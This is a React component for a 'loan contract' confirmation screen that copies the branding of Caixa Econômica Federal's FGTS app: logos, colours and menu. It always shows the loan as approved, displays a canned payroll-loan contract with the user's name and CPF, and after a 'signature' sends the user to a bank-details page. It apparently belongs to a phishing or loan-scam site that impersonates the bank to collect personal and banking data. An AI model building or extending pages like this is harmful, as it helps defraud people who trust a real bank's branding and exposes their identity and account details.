
import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { ArrowRight, FileText, User, Lock, Check, DollarSign, BarChart3, Home, HelpCircle, MoreHorizontal } from 'lucide-react';
import CaixaLogo from '@/components/CaixaLogo';
import FGTSLogo from '@/components/FGTSLogo';
import { Button } from '@/components/ui/button';
import { useIsMobile } from '@/hooks/use-mobile';
import { Checkbox } from '@/components/ui/checkbox';
import { Label } from '@/components/ui/label';

const LoanContract = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const isMobile = useIsMobile();
  const [isTermsAccepted, setIsTermsAccepted] = useState(false);
  
  // Get data from location state
  const { 
    bankLogo, 
    bankName, 
    totalAmount, 
    installmentsCount, 
    installmentValue,
    interestRate,
    userName,
    userCPF
  } = location.state || {
    bankLogo: "https://upload.wikimedia.org/wikipedia/commons/thumb/8/8d/Caixa_Econ%C3%B4mica_Federal_logo.svg/2560px-Caixa_Econ%C3%B4mica_Federal_logo.svg.png",
    bankName: "Caixa Econômica Federal",
    totalAmount: 10000,
    installmentsCount: 60,
    installmentValue: 250,
    interestRate: 0.018,
    userName: "JUAREZ JOSE FERNANDES DE FREITAS",
    userCPF: "123.456.789-00"
  };
  
  const formatCurrency = (value: number): string => {
    return new Intl.NumberFormat('pt-BR', {
      style: 'currency',
      currency: 'BRL',
      minimumFractionDigits: 2,
      maximumFractionDigits: 2
    }).format(value);
  };
  
  const handleConfirmSignature = () => {
    navigate('/bank-details', {
      state: { 
        bankLogo, 
        bankName, 
        totalAmount, 
        installmentsCount, 
        installmentValue,
        interestRate,
        userName,
        userCPF
      }
    });
  };
  
  // Create contract text with real values
  const contractText = `Contrato de Empréstimo Consignado CLT

Pelo presente contrato, a empresa concede ao(a) empregado(a) ${userName}, inscrito(a) no CPF nº ${userCPF}, um empréstimo consignado com as seguintes condições: o valor acordado de ${formatCurrency(totalAmount)} será pago em ${installmentsCount} parcelas mensais de ${formatCurrency(installmentValue)}, com juros de ${(interestRate * 100).toFixed(1)}% ao mês, descontados diretamente da folha de pagamento do(a) empregado(a).

O desconto será efetuado mensalmente, com o valor da parcela correspondente, de forma automática, pela empresa, até que o montante total do empréstimo seja quitado. A empresa compromete-se a realizar os descontos de acordo com o saldo devedor e com as condições aqui estabelecidas, sem a necessidade de aprovação do(a) empregado(a) para cada parcela.

O(a) empregado(a) concorda que, em caso de desligamento da empresa, o saldo devedor será descontado de suas verbas rescisórias ou, se necessário, acordado novo parcelamento diretamente com a instituição financeira responsável, observando o valor remanescente do empréstimo.

Este contrato é firmado de forma irrevogável, e as partes concordam com todos os termos e condições aqui descritos, estando cientes de seus direitos e deveres perante a legislação vigente sobre empréstimos consignados.`;

  return (
    <div className="min-h-screen flex flex-col bg-gradient-to-r from-[#008792] to-[#005CA9]">
      {/* Header */}
      <div className="p-4 sm:p-6 flex justify-between items-center">
        <FGTSLogo className={`${isMobile ? 'h-8 w-24' : 'h-10'}`} />
        <CaixaLogo className={`${isMobile ? 'h-8 w-24' : 'h-10'}`} />
      </div>

      {/* Title */}
      <div className="p-4 sm:p-6">
        <div className="text-white text-2xl font-light">Confirmação de Empréstimo</div>
        <div className="text-white opacity-60 text-sm mt-1">
          Revise seu contrato e confirme
        </div>
      </div>

      {/* Main content */}
      <div className="mt-4 flex-1 bg-white rounded-t-3xl overflow-hidden">
        <div className="p-4 sm:p-6 pb-28">
          {/* User info and approval status */}
          <div className="mb-6">
            <div className="flex items-center gap-2 mb-1">
              <User size={18} className="text-gray-600" />
              <h3 className="font-semibold">{userName}</h3>
            </div>
            <div className="flex items-center gap-2 mb-4">
              <span className="text-sm text-gray-600">CPF: {userCPF}</span>
            </div>
            <div className="bg-green-100 text-green-800 p-3 rounded-md flex items-center gap-2">
              <Check size={18} />
              <span className="font-medium">Empréstimo Aprovado</span>
            </div>
          </div>
          
          {/* Contract details before the contract text */}
          <div className="mb-6 space-y-4">
            <div className="grid grid-cols-2 gap-4">
              <div>
                <div className="text-sm text-gray-500">NOME COMPLETO</div>
                <div className="font-medium">{userName}</div>
              </div>
              <div>
                <div className="text-sm text-gray-500">CPF</div>
                <div className="font-medium">{userCPF}</div>
              </div>
            </div>
            
            <div className="grid grid-cols-3 gap-4">
              <div>
                <div className="text-sm text-gray-500">TAXA DE JUROS</div>
                <div className="font-medium">{(interestRate * 100).toFixed(1)}% ao mês</div>
              </div>
              <div>
                <div className="text-sm text-gray-500">VALOR DA PARCELA</div>
                <div className="font-medium">{formatCurrency(installmentValue)}</div>
              </div>
              <div>
                <div className="text-sm text-gray-500">BANCO FORNECEDOR</div>
                <div className="font-medium">{bankName}</div>
              </div>
            </div>
          </div>
          
          {/* Contract */}
          <div className="mb-6">
            <div className="flex items-center gap-2 mb-3">
              <FileText size={20} className="text-[#005CA9]" />
              <h2 className="text-[#005CA9] text-lg font-semibold">Contrato de Empréstimo</h2>
            </div>
            
            <div className="border border-gray-200 rounded-lg h-64 overflow-y-auto p-4 mb-4 bg-gray-50">
              <pre className="text-sm whitespace-pre-wrap font-sans">{contractText}</pre>
            </div>
            
            <div className="mt-6">
              <div className="flex items-center gap-2 mb-2">
                <img 
                  src={bankLogo} 
                  alt={bankName}
                  className="h-6 object-contain"
                />
                <span className="text-gray-700">{bankName}</span>
              </div>
              
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 mb-6">
                <div className="bg-gray-50 p-3 rounded-md">
                  <div className="text-sm text-gray-500">Valor do empréstimo</div>
                  <div className="font-medium text-gray-900">{formatCurrency(totalAmount)}</div>
                </div>
                <div className="bg-gray-50 p-3 rounded-md">
                  <div className="text-sm text-gray-500">Parcelas</div>
                  <div className="font-medium text-gray-900">{installmentsCount}x de {formatCurrency(installmentValue)}</div>
                </div>
              </div>
            </div>
          </div>
          
          {/* Checkbox for terms agreement */}
          <div className="flex items-start space-x-2 mb-8">
            <Checkbox 
              id="terms" 
              checked={isTermsAccepted} 
              onCheckedChange={(checked) => setIsTermsAccepted(checked as boolean)}
              className="mt-1"
            />
            <Label htmlFor="terms" className="text-sm text-gray-700">
              Declaro estar de acordo com as cláusulas do contrato, e aceito os termos e condições estabelecidos para o presente acordo.
            </Label>
          </div>
          
          {/* Sign button with more bottom margin */}
          <Button 
            className="w-full bg-[#005CA9] hover:bg-[#004A87] text-white px-6 py-6 rounded-full mb-12"
            onClick={handleConfirmSignature}
            disabled={!isTermsAccepted}
          >
            <Lock className="w-5 h-5 mr-2" />
            CONFIRMAR ASSINATURA DE CONTRATO
            <ArrowRight className="w-5 h-5 ml-2" />
          </Button>
        </div>
        
        {/* Footer */}
        <div className="fixed bottom-0 w-full bg-white border-t border-gray-200">
          <div className="flex justify-around items-center py-3">
            <div className="flex flex-col items-center text-gray-500">
              <Home size={24} />
              <span className="text-xs mt-1">Principal</span>
            </div>
            <div className="flex flex-col items-center text-gray-500">
              <BarChart3 size={24} />
              <span className="text-xs mt-1">Meu FGTS</span>
            </div>
            <div className="flex flex-col items-center">
              <div className="bg-[#FF8C00] rounded-full w-12 h-12 flex items-center justify-center">
                <DollarSign size={24} className="text-white" />
              </div>
              <span className="text-xs mt-1 text-[#FF8C00]">Mais Saques</span>
            </div>
            <div className="flex flex-col items-center text-gray-500">
              <HelpCircle size={24} />
              <span className="text-xs mt-1">Ajuda</span>
            </div>
            <div className="flex flex-col items-center text-gray-500">
              <MoreHorizontal size={24} />
              <span className="text-xs mt-1">Mais</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default LoanContract;
